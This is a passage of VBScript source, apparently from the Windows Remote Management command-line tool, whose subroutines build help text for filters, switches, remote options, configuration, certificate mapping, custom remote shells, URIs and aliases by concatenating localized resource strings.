GetResource("L_HelpProxyUsername_006_0_Message") & NL & _
GetResource("L_HelpProxyUsername_007_0_Message") & NL & _
GetResource("L_HelpProxyUsername_008_0_Message") & NL & _
GetResource("L_HelpProxyUsername_009_0_Message") & NL & _
GetResource("L_HelpProxyPassword_001_0_Message") & NL & _
GetResource("L_HelpProxyPassword_002_0_Message") & NL & _
GetResource("L_HelpProxyPassword_003_0_Message") & NL & _
GetResource("L_HelpProxyPassword_004_0_Message") & NL & _
GetResource("L_Help_Blank_0_Message") & NL & _
GetResource("L_Help_SeeAlso_Title_Message") & NL & _
GetResource("X_Help_SeeAlso_Uris_Message") & NL & _
GetResource("X_Help_SeeAlso_Auth_Message") & NL & _
GetResource("X_Help_SeeAlso_Aliases_Message") & NL & _
GetResource("X_Help_SeeAlso_Input_Message") & NL & _
GetResource("X_Help_SeeAlso_Switches_Message")
End Sub

'''''''''''''''''''''
' HELP - FILTERS
Private Sub HelpFilters(stream)
dim NL 
NL = vbNewLine
stream.WriteLine _
GetResource("L_HelpFilter_001_0_Message") & NL & _
GetResource("X_HelpFilter_002_0_Message") & NL & _
GetResource("X_HelpFilter_003_0_Message") & NL & _
GetResource("X_HelpFilter_004_0_Message") & NL & _
GetResource("L_HelpFilter_005_0_Message") & NL & _
GetResource("X_HelpFilter_006_0_Message") & NL & _
GetResource("L_HelpFilter_007_0_Message") & NL & _
GetResource("X_HelpFilter_008_0_Message") & NL & _
GetResource("L_HelpFilter_009_0_Message") & NL & _
GetResource("X_HelpFilter_010_0_Message") & NL & _
GetResource("L_HelpFilter_011_0_Message") & NL & _
GetResource("L_HelpFilter_012_0_Message") & NL & _
GetResource("X_HelpFilter_013_0_Message") & NL & _
GetResource("L_HelpFilter_014_0_Message") & NL & _
GetResource("X_HelpFilter_015_0_Message") & NL & _
GetResource("X_HelpFilter_016_0_Message") & NL & _
GetResource("X_HelpFilter_016_1_Message") & NL & _
GetResource("X_HelpFilter_017_0_Message") & NL & _
GetResource("L_HelpFilter_018_0_Message") & NL & _
GetResource("X_HelpFilter_019_0_Message") & NL & _
GetResource("L_HelpFilter_019_1_Message") & NL & _
GetResource("L_HelpFilter_019_2_Message") & NL & _
GetResource("X_HelpFilter_019_3_Message") & NL & _
GetResource("X_HelpFilter_019_4_Message") & NL & _
GetResource("X_HelpFilter_019_5_Message") & NL & _
GetResource("L_HelpFilter_020_0_Message") & NL & _
GetResource("X_HelpFilter_021_0_Message") & NL & _
GetResource("X_HelpFilter_022_0_Message") & NL & _
GetResource("L_HelpFilter_023_0_Message") & NL & _
GetResource("X_HelpFilter_024_0_Message") & NL & _
GetResource("L_HelpFilter_025_0_Message") & NL & _
GetResource("L_HelpFilter_026_0_Message") & NL & _
GetResource("X_HelpFilter_027_0_Message") & NL & _
GetResource("L_Help_Blank_0_Message") & NL & _
GetResource("L_Help_SeeAlso_Title_Message") & NL & _
GetResource("X_Help_SeeAlso_Enumerate_Message")
End Sub


'''''''''''''''''''''
' HELP - SWITCHES
Private Sub HelpSwitches(stream)
dim NL 
NL = vbNewLine
stream.WriteLine _
GetResource("L_HelpSwitchTimeout_001_0_Message") & NL & _
GetResource("L_HelpSwitchTimeout_002_0_Message") & NL & _
GetResource("L_HelpSwitchTimeout_003_0_Message") & NL & _
GetResource("L_HelpSwitchTimeout_004_0_Message") & NL & _
GetResource("X_HelpSwitchTimeout_005_0_Message") & NL & _
GetResource("L_HelpSwitchTimeout_006_0_Message") & NL & _
GetResource("L_Help_Blank_0_Message") & NL & _
GetResource("X_HelpSwitchSkipCACheck_001_0_Message") & NL & _
GetResource("L_HelpSwitchSkipCACheck_002_0_Message") & NL & _
GetResource("L_HelpSwitchSkipCACheck_003_0_Message") & NL & _
GetResource("L_HelpSwitchSkipCACheck_004_0_Message") & NL & _
GetResource("L_HelpSwitchSkipCACheck_005_0_Message") & NL & _
GetResource("L_Help_Blank_0_Message") & NL & _
GetResource("X_HelpSwitchSkipCNCheck_001_0_Message") & NL & _
GetResource("L_HelpSwitchSkipCNCheck_002_0_Message") & NL & _
GetResource("L_HelpSwitchSkipCNCheck_003_0_Message") & NL & _
GetResource("L_HelpSwitchSkipCNCheck_004_0_Message") & NL & _
GetResource("L_HelpSwitchSkipCNCheck_005_0_Message") & NL & _
GetResource("L_HelpSwitchSkipCNCheck_006_0_Message") & NL & _
GetResource("L_Help_Blank_0_Message") & NL & _
GetResource("X_HelpSwitchSkipRevCheck_001_0_Message") & NL & _
GetResource("X_HelpSwitchSkipRevCheck_002_0_Message") & NL & _
GetResource("L_HelpSwitchSkipRevCheck_003_0_Message") & NL & _
GetResource("L_HelpSwitchSkipRevCheck_004_0_Message") & NL & _
GetResource("L_HelpSwitchSkipRevCheck_005_0_Message") & NL & _
GetResource("L_Help_Blank_0_Message") & NL & _
GetResource("X_HelpSwitchDefaultCreds_001_0_Message") & NL & _
GetResource("X_HelpSwitchDefaultCreds_002_0_Message") & NL & _
GetResource("L_HelpSwitchDefaultCreds_003_0_Message") & NL & _
GetResource("L_HelpSwitchDefaultCreds_004_0_Message") & NL & _
GetResource("L_Help_Blank_0_Message") & NL & _
GetResource("L_HelpSwitchDialect_001_0_Message") & NL & _
GetResource("L_HelpSwitchDialect_002_0_Message") & NL & _
GetResource("L_HelpSwitchDialect_003_0_Message") & NL & _
GetResource("L_HelpSwitchDialect_004_0_Message") & NL & _
GetResource("X_HelpSwitchDialect_005_0_Message") & NL & _
GetResource("L_HelpSwitchDialect_006_0_Message") & NL & _
GetResource("X_HelpSwitchDialect_007_0_Message") & NL & _
GetResource("L_Help_Blank_0_Message") & NL & _
GetResource("L_HelpSwitchFragment_001_0_Message") & NL & _
GetResource("L_HelpSwitchFragment_002_0_Message") & NL & _
GetResource("L_HelpSwitchFragment_003_0_Message") & NL & _
GetResource("L_HelpSwitchFragment_004_0_Message") & NL & _
GetResource("L_HelpSwitchFragment_005_0_Message") & NL & _
GetResource("X_HelpSwitchFragment_006_0_Message") & NL & _
GetResource("L_Help_Blank_0_Message") & NL & _
GetResource("L_HelpSwitchOption_001_0_Message") & NL & _
GetResource("L_HelpSwitchOption_002_0_Message") & NL & _
GetResource("L_HelpSwitchOption_003_0_Message") & NL & _
GetResource("L_HelpSwitchOption_004_0_Message") & NL & _
GetResource("L_HelpSwitchOption_005_0_Message") & NL & _
GetResource("L_HelpSwitchOption_006_0_Message") & NL & _
GetResource("X_HelpSwitchOption_007_0_Message") & NL & _
GetResource("X_HelpSwitchOption_008_0_Message") & NL & _
GetResource("L_Help_Blank_0_Message") & NL & _
GetResource("X_HelpSwitchSPNPort_001_0_Message") & NL & _
GetResource("L_HelpSwitchSPNPort_002_0_Message") & NL & _
GetResource("L_HelpSwitchSPNPort_003_0_Message") & NL & _
GetResource("L_HelpSwitchSPNPort_004_0_Message") & NL & _
GetResource("L_HelpSwitchSPNPort_005_0_Message") & NL & _
GetResource("L_Help_Blank_0_Message") & NL & _
GetResource("L_HelpSwitchEncoding_001_0_Message") & NL & _
GetResource("L_HelpSwitchEncoding_002_0_Message") & NL & _
GetResource("L_HelpSwitchEncoding_003_0_Message") & NL & _
GetResource("L_HelpSwitchEncoding_004_0_Message") & NL & _
GetResource("L_HelpSwitchEncoding_005_0_Message") & NL & _
GetResource("L_HelpSwitchEncoding_006_0_Message") & NL & _
GetResource("X_HelpSwitchEncoding_007_0_Message") & NL & _
GetResource("X_HelpSwitchEncoding_008_0_Message") & NL & _
GetResource("L_Help_Blank_0_Message") & NL & _
GetResource("L_HelpSwitchFormat_001_0_Message") & NL & _
GetResource("L_HelpSwitchFormat_002_0_Message") & NL & _
GetResource("L_HelpSwitchFormat_003_0_Message") & NL & _
GetResource("L_HelpSwitchFormat_004_0_Message") & NL & _
GetResource("L_HelpSwitchFormat_005_0_Message") & NL & _
GetResource("X_HelpSwitchFormat_006_0_Message") & NL & _
GetResource("X_HelpSwitchFormat_007_0_Message") & NL & _
GetResource("X_HelpSwitchFormat_008_0_Message")
End Sub

'''''''''''''''''''''
' HELP - INPUT
Private Sub HelpInput(stream)
dim NL 
NL = vbNewLine
stream.WriteLine _
GetResource("L_HelpInput_001_0_Message") & NL & _
GetResource("L_HelpInput_002_0_Message") & NL & _
GetResource("L_HelpInput_003_0_Message") & NL & _
GetResource("L_HelpInput_004_0_Message") & NL & _
GetResource("L_HelpInput_005_0_Message") & NL & _
GetResource("L_HelpInput_006_0_Message") & NL & _
GetResource("L_HelpInput_007_0_Message") & NL & _
GetResource("L_HelpInput_008_0_Message") & NL & _
GetResource("L_HelpInput_009_0_Message") & NL & _
GetResource("L_HelpInput_010_0_Message") & NL & _
GetResource("L_HelpInput_011_0_Message") & NL & _
GetResource("L_HelpInput_012_0_Message") & NL & _
GetResource("L_HelpInput_013_0_Message") & NL & _
GetResource("L_HelpInput_014_0_Message") & NL & _
GetResource("L_HelpInput_015_0_Message") & NL & _
GetResource("L_HelpInput_016_0_Message") & NL & _
GetResource("L_HelpInput_017_0_Message") & NL & _
GetResource("L_HelpInput_018_0_Message") & NL & _
GetResource("L_HelpInput_019_0_Message") & NL & _
GetResource("L_HelpInput_020_0_Message") & NL & _
GetResource("L_HelpInput_021_0_Message") & NL & _
GetResource("L_HelpInput_022_0_Message") & NL & _
GetResource("X_HelpInput_023_0_Message") & NL & _
GetResource("X_HelpInput_024_0_Message") & NL & _
GetResource("L_Help_Blank_0_Message") & NL & _
GetResource("L_Help_SeeAlso_Title_Message") & NL & _
GetResource("X_Help_SeeAlso_Set_Message") & NL & _
GetResource("X_Help_SeeAlso_Create_Message") & NL & _
GetResource("X_Help_SeeAlso_Invoke_Message")
End Sub

'''''''''''''''''''''
' HELP - REMOTE
Private Sub HelpRemote(stream)
dim NL 
NL = vbNewLine
stream.WriteLine _
GetResource("L_HelpRemote_001_0_Message") & NL & _
GetResource("L_HelpRemote_002_0_Message") & NL & _
GetResource("L_HelpRemote_003_0_Message") & NL & _
GetResource("L_HelpRemote_004_0_Message") & NL & _
GetResource("L_HelpRemote_005_0_Message") & NL & _
GetResource("L_HelpRemote_006_0_Message") & NL & _
GetResource("L_HelpRemote_007_0_Message") & NL & _
GetResource("L_HelpRemote_008_0_Message") & NL & _
GetResource("L_HelpRemote_009_0_Message") & NL & _
GetResource("L_HelpRemote_010_0_Message") & NL & _
GetResource("L_HelpRemote_011_0_Message") & NL & _
GetResource("L_HelpRemote_012_0_Message") & NL & _
GetResource("L_HelpRemote_012_1_Message") & NL & _
GetResource("L_HelpRemote_012_2_Message") & NL & _
GetResource("L_HelpRemote_012_3_Message") & NL & _
GetResource("L_HelpRemote_012_4_Message") & NL & _
GetResource("L_HelpRemote_012_5_Message") & NL & _
GetResource("L_HelpRemote_012_6_Message") & NL & _
GetResource("L_HelpRemote_013_0_Message") & NL & _
GetResource("L_HelpRemote_014_0_Message") & NL & _
GetResource("L_HelpRemote_015_0_Message") & NL & _
GetResource("L_HelpRemote_016_0_Message") & NL & _
GetResource("L_HelpRemote_017_0_Message") & NL & _
GetResource("L_HelpRemote_018_0_Message") & NL & _
GetResource("L_Help_Blank_0_Message") & NL & _
GetResource("L_HelpRemoteExample_001_0_Message") & NL & _
GetResource("X_HelpRemoteExample_002_0_Message") & NL & _
GetResource("L_HelpRemoteExample_003_0_Message") & NL & _
GetResource("L_HelpRemoteExample_004_0_Message") & NL & _
GetResource("X_HelpRemoteExample_005_0_Message") & NL & _
GetResource("L_HelpRemoteExample_006_0_Message") & NL & _
GetResource("L_HelpRemoteExample_007_0_Message") & NL & _
GetResource("X_HelpRemoteExample_008_0_Message") & NL & _
GetResource("L_HelpRemoteExample_009_0_Message") & NL & _
GetResource("L_HelpRemoteExample_010_0_Message") & NL & _
GetResource("X_HelpRemoteExample_011_0_Message") & NL & _
GetResource("L_Help_Blank_0_Message") & NL & _
GetResource("L_HelpRemoteUnencrypted_001_0_Message") & NL & _
GetResource("L_HelpRemoteUnencrypted_002_0_Message") & NL & _
GetResource("L_HelpRemoteUnencrypted_003_0_Message") & NL & _
GetResource("L_HelpRemoteUnencrypted_004_0_Message") & NL & _
GetResource("L_HelpRemoteUnencrypted_005_0_Message") & NL & _
GetResource("L_Help_Blank_0_Message") & NL & _
GetResource("L_HelpRemoteUseSsl_001_0_Message") & NL & _
GetResource("L_HelpRemoteUseSsl_002_0_Message") & NL & _
GetResource("L_HelpRemoteUseSsl_003_0_Message") & NL & _
GetResource("L_HelpRemoteUseSsl_004_0_Message") & NL & _
GetResource("L_Help_Blank_0_Message") & NL & _
GetResource("L_HelpRemoteConfig_001_0_Message") & NL & _
GetResource("X_Help_SeeAlso_Config_Message") & NL & _
GetResource("L_Help_Blank_0_Message") & NL & _
GetResource("L_Help_SeeAlso_Title_Message") & NL & _
GetResource("X_Help_SeeAlso_Uris_Message") & NL & _
GetResource("X_Help_SeeAlso_Aliases_Message") & NL & _
GetResource("X_Help_SeeAlso_Input_Message") & NL & _
GetResource("X_Help_SeeAlso_Switches_Message")
End Sub

'''''''''''''''''''''
' HELP - CONFIG
Private Sub HelpConfig(stream)
dim NL 
NL = vbNewLine
stream.WriteLine _
GetResource("L_HelpConfig_001_0_Message") & NL & _
GetResource("L_HelpConfig_002_0_Message") & NL & _
GetResource("L_HelpConfig_003_0_Message") & NL & _
GetResource("L_HelpConfig_004_0_Message") & NL & _
GetResource("L_HelpConfig_005_0_Message") & NL & _
GetResource("L_HelpConfig_006_0_Message") & NL & _
GetResource("L_HelpConfig_007_0_Message") & NL & _
GetResource("L_HelpConfig_008_0_Message") & NL & _
GetResource("L_HelpConfig_009_0_Message") & NL & _
GetResource("X_HelpConfig_010_0_Message") & NL & _
GetResource("X_HelpConfig_011_0_Message") & NL & _
GetResource("X_HelpConfig_012_0_Message") & NL & _
GetResource("X_HelpConfig_012_1_Message") & NL & _
GetResource("X_HelpConfig_012_2_Message") & NL & _
GetResource("X_HelpConfig_012_3_Message") & NL & _
GetResource("X_HelpConfig_012_4_Message") & NL & _
GetResource("L_HelpConfig_013_0_Message") & NL & _
GetResource("L_HelpConfig_014_0_Message") & NL & _
GetResource("L_HelpConfig_015_0_Message") & NL & _
GetResource("L_Help_Blank_0_Message") & NL & _
GetResource("L_HelpConfigAddress_001_0_Message") & NL & _
GetResource("L_HelpConfigAddress_002_0_Message") & NL & _
GetResource("L_HelpConfigAddress_003_0_Message") & NL & _
GetResource("L_HelpConfigAddress_004_0_Message") & NL & _
GetResource("L_HelpConfigAddress_005_0_Message") & NL & _
GetResource("L_HelpConfigAddress_006_0_Message") & NL & _
GetResource("L_HelpConfigAddress_007_0_Message") & NL & _
GetResource("L_HelpConfigAddress_008_0_Message") & NL & _
GetResource("L_Help_Blank_0_Message") & NL & _
GetResource("L_Help_Blank_0_Message") & NL & _
GetResource("L_HelpConfigTransport_001_0_Message") & NL & _
GetResource("L_HelpConfigTransport_002_0_Message") & NL & _
GetResource("L_HelpConfigTransport_003_0_Message") & NL & _
GetResource("L_HelpConfigTransport_004_0_Message") & NL & _
GetResource("L_HelpConfigTransport_005_0_Message") & NL & _
GetResource("L_HelpConfigTransport_006_0_Message") & NL & _
GetResource("L_HelpConfigTransport_007_0_Message") & NL & _
GetResource("L_HelpConfigTransport_008_0_Message") & NL & _
GetResource("L_HelpConfigTransport_009_0_Message") & NL & _
GetResource("L_HelpConfigTransport_010_0_Message") & NL & _
GetResource("L_HelpConfigTransport_011_0_Message") & NL & _
GetResource("L_HelpConfigTransport_012_0_Message") & NL & _
GetResource("L_HelpConfigTransport_013_0_Message") & NL & _
GetResource("L_HelpConfigTransport_014_0_Message") & NL & _
GetResource("L_Help_Blank_0_Message") & NL & _
GetResource("L_HelpConfigExamples_001_0_Message") & NL & _
GetResource("X_HelpConfigExamples_002_0_Message") & NL & _
GetResource("L_HelpConfigExamples_003_0_Message") & NL & _
GetResource("L_HelpConfigExamples_004_0_Message") & NL & _
GetResource("X_HelpConfigExamples_005_0_Message") & NL & _
GetResource("L_HelpConfigExamples_006_0_Message") & NL & _
GetResource("L_HelpConfigExamples_007_0_Message") & NL & _
GetResource("X_HelpConfigExamples_008_0_Message") & NL & _
GetResource("L_HelpConfigExamples_009_0_Message") & NL & _
GetResource("L_HelpConfigExamples_010_0_Message") & NL & _
GetResource("X_HelpConfigExamples_011_0_Message") & NL & _
GetResource("L_Help_Blank_0_Message") & NL & _
GetResource("L_Help_SeeAlso_Title_Message") & NL & _
GetResource("X_Help_SeeAlso_Uris_Message") & NL & _
GetResource("X_Help_SeeAlso_Aliases_Message") & NL & _
GetResource("X_Help_SeeAlso_CertMapping_Message") & NL & _
GetResource("X_Help_SeeAlso_Input_Message") & NL & _
GetResource("X_Help_SeeAlso_Switches_Message")
End Sub

'''''''''''''''''''''
' HELP - CertMapping
Private Sub HelpCertMapping(stream)
dim NL 
NL = vbNewLine
stream.WriteLine _
GetResource("L_HelpCertMapping_001_0_Message") & NL & _
GetResource("L_HelpCertMapping_002_0_Message") & NL & _
GetResource("L_HelpCertMapping_003_0_Message") & NL & _
GetResource("L_HelpCertMapping_003_1_Message") & NL & _
GetResource("L_HelpCertMapping_004_0_Message") & NL & _
GetResource("L_HelpCertMapping_005_0_Message") & NL & _
GetResource("L_HelpCertMapping_006_0_Message") & NL & _
GetResource("L_HelpCertMapping_007_0_Message") & NL & _
GetResource("L_HelpCertMapping_008_0_Message") & NL & _
GetResource("L_HelpCertMapping_009_0_Message") & NL & _
GetResource("L_HelpCertMapping_009_1_Message") & NL & _
GetResource("L_HelpCertMapping_009_2_Message") & NL & _
GetResource("L_HelpCertMapping_009_3_Message") & NL & _
GetResource("L_HelpCertMapping_010_0_Message") & NL & _
GetResource("L_HelpCertMapping_011_0_Message") & NL & _
GetResource("L_HelpCertMapping_012_0_Message") & NL & _
GetResource("L_HelpCertMapping_012_1_Message") & NL & _
GetResource("L_HelpCertMapping_012_2_Message") & NL & _
GetResource("L_HelpCertMapping_013_0_Message") & NL & _
GetResource("L_HelpCertMapping_014_0_Message") & NL & _
GetResource("L_HelpCertMapping_014_1_Message") & NL & _
GetResource("L_HelpCertMapping_014_2_Message") & NL & _
GetResource("L_HelpCertMapping_014_3_Message") & NL & _
GetResource("L_HelpCertMapping_014_4_Message") & NL & _
GetResource("L_HelpCertMapping_015_0_Message") & NL & _
GetResource("L_HelpCertMapping_016_0_Message") & NL & _
GetResource("L_HelpCertMapping_017_0_Message") & NL & _
GetResource("L_HelpCertMapping_018_0_Message") & NL & _
GetResource("L_HelpCertMapping_019_0_Message") & NL & _
GetResource("L_HelpCertMapping_020_0_Message") & NL & _
GetResource("L_HelpCertMapping_021_0_Message") & NL & _
GetResource("L_HelpCertMapping_022_0_Message") & NL & _
GetResource("L_Help_Blank_0_Message") & NL & _
GetResource("L_Help_Blank_0_Message") & NL & _
GetResource("L_Help_Blank_0_Message") & NL & _
GetResource("L_HelpCertMappingExamples_001_0_Message") & NL & _
GetResource("X_HelpCertMappingExamples_002_0_Message") & NL & _
GetResource("L_Help_Blank_0_Message") & NL & _
GetResource("L_HelpCertMappingExamples_003_0_Message") & NL & _
GetResource("X_HelpCertMappingExamples_004_0_Message") & NL & _
GetResource("L_HelpCertMappingExamples_005_0_Message") & NL & _
GetResource("L_Help_Blank_0_Message") & NL & _
GetResource("L_Help_SeeAlso_Title_Message") & NL & _
GetResource("X_Help_SeeAlso_configSDDL_Message") & NL & _
GetResource("X_Help_SeeAlso_Input_Message") & NL & _
GetResource("X_Help_SeeAlso_Switches_Message")
End Sub

'''''''''''''''''''''
' HELP - CUSTOMREMOTESHELL
Private Sub HelpCustomRemoteShell(stream)
dim NL 
NL = vbNewLine
stream.WriteLine _
GetResource("L_HelpCustomRemoteShell_001_0_Message") & NL & _
GetResource("L_HelpCustomRemoteShell_001_1_Message") & NL & _
GetResource("L_HelpCustomRemoteShell_002_0_Message") & NL & _
GetResource("L_HelpCustomRemoteShell_003_0_Message") & NL & _
GetResource("L_HelpCustomRemoteShell_004_0_Message") & NL & _
GetResource("L_HelpCustomRemoteShell_005_0_Message") & NL & _
GetResource("L_HelpCustomRemoteShell_006_0_Message") & NL & _
GetResource("L_HelpCustomRemoteShell_007_0_Message") & NL & _
GetResource("L_HelpCustomRemoteShell_008_0_Message") & NL & _
GetResource("L_HelpCustomRemoteShell_009_0_Message") & NL & _
GetResource("L_HelpCustomRemoteShell_010_0_Message") & NL & _
GetResource("L_HelpCustomRemoteShell_011_0_Message") & NL & _
GetResource("L_HelpCustomRemoteShell_011_1_Message") & NL & _
GetResource("L_HelpCustomRemoteShell_012_0_Message") & NL & _
GetResource("L_HelpCustomRemoteShell_012_1_Message") & NL & _
GetResource("L_HelpCustomRemoteShell_012_2_Message") & NL & _
GetResource("L_HelpCustomRemoteShell_013_0_Message") & NL & _
GetResource("L_HelpCustomRemoteShell_013_1_Message") & NL & _
GetResource("L_HelpCustomRemoteShell_014_0_Message") & NL & _
GetResource("L_Help_Blank_0_Message") & NL & _
GetResource("L_Help_Blank_0_Message") & NL & _
GetResource("L_Help_Blank_0_Message") & NL & _
GetResource("L_HelpCustomRemoteShellExamples_001_0_Message") & NL & _
GetResource("X_HelpCustomRemoteShellExamples_002_0_Message") & NL & _
GetResource("L_HelpCustomRemoteShellExamples_003_0_Message") & NL & _
GetResource("L_HelpCustomRemoteShellExamples_004_0_Message") & NL & _
GetResource("X_HelpCustomRemoteShellExamples_005_0_Message") & NL & _
GetResource("L_HelpCustomRemoteShellExamples_006_0_Message") & NL & _
GetResource("L_Help_Blank_0_Message") & NL & _
GetResource("L_Help_SeeAlso_Title_Message")
End Sub

'''''''''''''''''''''
' HELP - QUICKCONFIG
Private Sub HelpQuickConfig(stream)
dim NL 
NL = vbNewLine
stream.WriteLine _
GetResource("X_HelpQuickConfig_001_0_Message") & NL & _
GetResource("X_HelpQuickConfig_002_0_Message") & NL & _
GetResource("L_HelpQuickConfig_003_0_Message") & NL & _
GetResource("L_HelpQuickConfig_004_0_Message") & NL & _
GetResource("L_HelpQuickConfig_005_0_Message") & NL & _
GetResource("L_HelpQuickConfig_006_0_Message") & NL & _
GetResource("L_HelpQuickConfig_007_0_Message") & NL & _
GetResource("L_HelpQuickConfig_008_0_Message") & NL & _
GetResource("X_HelpQuickConfig_009_0_Message") & NL & _
GetResource("X_HelpQuickConfig_010_0_Message") & NL & _
GetResource("X_HelpQuickConfig_010_1_Message") & NL & _
GetResource("L_HelpQuickConfig_011_0_Message") & NL & _
GetResource("L_Help_Blank_0_Message") & NL & _
GetResource("X_HelpQuickConfig_012_0_Message") & NL & _
GetResource("X_HelpQuickConfig_013_0_Message") & NL & _
GetResource("L_HelpQuickConfig_014_0_Message") & NL & _
GetResource("L_HelpQuickConfig_015_0_Message") & NL & _
GetResource("L_Help_Blank_0_Message") & NL & _
GetResource("X_HelpQuickConfig_016_0_Message") & NL & _
GetResource("X_HelpQuickConfig_017_0_Message") & NL & _
GetResource("L_HelpQuickConfig_018_0_Message") & NL & _
GetResource("L_HelpQuickConfig_019_0_Message") & NL & _
GetResource("L_Help_Blank_0_Message") & NL & _
GetResource("L_Help_SeeAlso_Title_Message") & NL & _
GetResource("X_Help_SeeAlso_Config_Message")
End Sub

'''''''''''''''''''''
' HELP - URIS
Private Sub HelpUris(stream)
dim NL 
NL = vbNewLine
stream.WriteLine _
GetResource("L_HelpUris_001_0_Message") & NL & _
GetResource("L_HelpUris_002_0_Message") & NL & _
GetResource("L_HelpUris_003_0_Message") & NL & _
GetResource("L_HelpUris_004_0_Message") & NL & _
GetResource("X_HelpUris_005_0_Message") & NL & _
GetResource("L_HelpUris_006_0_Message") & NL & _
GetResource("L_HelpUris_007_0_Message") & NL & _
GetResource("X_HelpUris_008_0_Message") & NL & _
GetResource("X_HelpUris_009_0_Message") & NL & _
GetResource("X_HelpUris_010_0_Message") & NL & _
GetResource("L_HelpUris_011_0_Message") & NL & _
GetResource("L_HelpUris_012_0_Message") & NL & _
GetResource("X_HelpUris_013_0_Message") & NL & _
GetResource("X_HelpUris_013_1_Message") & NL & _
GetResource("X_HelpUris_014_0_Message") & NL & _
GetResource("L_HelpUris_015_0_Message") & NL & _
GetResource("L_HelpUris_015_1_Message") & NL & _
GetResource("L_HelpUris_015_2_Message") & NL & _
GetResource("L_HelpUris_015_3_Message") & NL & _
GetResource("X_HelpUris_015_4_Message") & NL & _
GetResource("L_HelpUris_015_5_Message") & NL & _
GetResource("L_HelpUris_015_6_Message") & NL & _
GetResource("L_HelpUris_015_7_Message") & NL & _
GetResource("X_HelpUris_015_8_Message") & NL & _
GetResource("L_HelpUris_015_9_Message") & NL & _
GetResource("L_HelpUris_016_0_Message") & NL & _
GetResource("L_HelpUris_017_0_Message") & NL & _
GetResource("L_HelpUris_018_0_Message") & NL & _
GetResource("L_Help_Blank_0_Message") & NL & _
GetResource("L_Help_SeeAlso_Title_Message") & NL & _
GetResource("X_Help_SeeAlso_Uris_Message") & NL & _
GetResource("X_Help_SeeAlso_Aliases_Message") & NL & _
GetResource("X_Help_SeeAlso_Input_Message") & NL & _
GetResource("X_Help_SeeAlso_Switches_Message")
End Sub

'''''''''''''''''''''
' HELP - ALIAS
Private Sub HelpAlias(stream)
dim NL 
NL = vbNewLine
stream.WriteLine _
GetResource("L_HelpAlias_001_0_Message") & NL & _
GetResource("L_HelpAlias_002_0_Message") & NL & _
GetResource("L_HelpAlias_003_0_Message") & NL & _
GetResource("X_HelpAlias_004_0_Message") & NL & _
GetResource("X_HelpAlias_005_0_Message") & NL & _
GetResource("X_HelpAlias_006_0_Message") & NL & _
GetResource("X_HelpAlias_007_0_Message") & NL & _
GetResource("X_HelpAlias_008_0_Message") & NL & _
GetResource("X_HelpAlias_009_0_Message") & NL & _
GetResource("L_HelpAlias_010_0_Message") & NL & _
GetResource("L_HelpAlias_011_0_Message") & NL & _
GetResource("x_HelpAlias_012_0_Message") & NL & _
GetResource("L_HelpAlias_013_0_Message") & NL & _
GetResource("L_HelpAlias_014_0_Message") & NL & _
GetResource("X_HelpAlias_015_0_Message") & NL & _
GetResource("L_Help_Blank_0_Message") & NL & _
GetResource("L_Help_SeeAlso_Title_Message") & NL & _
GetResource("X_Help_SeeAlso_Aliases_Message")
End Sub